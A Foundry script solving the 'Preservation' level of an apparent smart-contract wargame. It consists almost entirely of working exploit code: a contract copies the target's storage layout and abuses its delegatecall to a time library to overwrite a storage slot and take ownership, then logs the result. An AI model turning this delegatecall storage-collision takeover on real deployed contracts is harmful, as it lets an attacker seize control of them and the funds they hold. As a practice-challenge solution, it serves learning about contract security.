// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/16-Preservation/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract TimeAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }

    function exploit(Preservation _preservationInstance) public {
        Preservation preservationInstance = _preservationInstance;
        preservationInstance.setFirstTime(uint256(uint160(address(this)))); // change the slot 0 for Preservation
        preservationInstance.setFirstTime(1); // call TimeAttacker.setTime to change owner
    }
}


contract Level16Solution is Script {
    Preservation _preservationInstance = Preservation(0x0F58FA213B906BB3d7fF411c21100447A2B30541);

    function run() public{
        vm.startBroadcast();
        
        bytes32 timeZone1 = vm.load(address(_preservationInstance), bytes32(uint256(0)));
        console.log("timeZone1 : ", uint256(timeZone1));

        TimeAttacker _timeAttacker = new TimeAttacker();
        _timeAttacker.exploit(_preservationInstance);
        
        timeZone1 = vm.load(address(_preservationInstance), bytes32(uint256(0)));
        console.log("timeZone1 : ", uint256(timeZone1));
        console.log("owner : ", _preservationInstance.owner());
        
        vm.stopBroadcast();
    }
}